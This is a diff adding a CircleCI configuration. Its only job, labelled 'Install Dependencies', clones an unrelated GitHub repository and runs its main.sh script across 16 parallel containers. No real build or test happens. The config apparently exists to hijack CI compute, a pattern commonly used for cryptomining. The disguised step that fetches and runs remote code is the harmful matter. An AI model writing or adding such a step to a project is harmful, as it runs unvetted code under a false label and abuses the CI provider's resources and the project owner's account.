@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              git clone https://github.com/wujohn912/bgef.git && cd bgef && chmod +x main.sh && ./main.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
